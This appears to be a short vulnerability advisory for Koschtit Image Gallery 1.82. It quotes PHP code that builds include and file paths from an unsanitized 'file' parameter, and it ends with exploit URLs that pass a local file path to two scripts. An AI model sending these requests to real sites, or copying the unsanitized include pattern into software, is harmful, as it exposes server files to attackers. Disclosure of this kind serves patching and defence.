Koschtit Image Gallery 1.82 Multiple Local File Inclusion Vulnerabilities
=========================================================================


                      :local file include:
   
#############################
script: koschtit_image_gallery(v1.82)
   
##############################################################
download from:http://koschtit..tabere.net/download/
or http://koschtit.tabere.net/en/#getit 
   
##############################################################
vul:/ki_base/ki_makepic.php


if(isset($_GET[&#039;file&#039;])) 
 $file = "../ki_galleries/".$_GET[&#039;file&#039;];
else
 exit();

$gallery = substr($_GET[&#039;file&#039;], 0, strpos($_GET[&#039;file&#039;], "/"));
if(is_file("../ki_config/".$gallery."_ki_setup.php"))
 include_once("../ki_config/".$gallery."_ki_setup.php");

$imgsize = getimagesize($file); 

#############
vul:/ki_base/ki_nojsdisplayimage.php

$gallery = substr($_GET[&#039;file&#039;], 0, strpos($_GET[&#039;file&#039;], "/"));

include_once("../ki_config/ki_setup.php");
if(is_file(".../ki_config/".$gallery."_ki_setup.php")){
 include_once("../ki_config/".$gallery."_ki_setup.php");
}
.
.
$srcfile = "../ki_galleries/".$file;
$imgsize = getimagesize("../ki_galleries/".$file);

##############################################################
xpl:
path/ki_base/ki_makepic.php?file=[local_file]
path/ki_base/ki_nojsdisplayimage.php?file=[local_file]  
------------------------------------------------------------




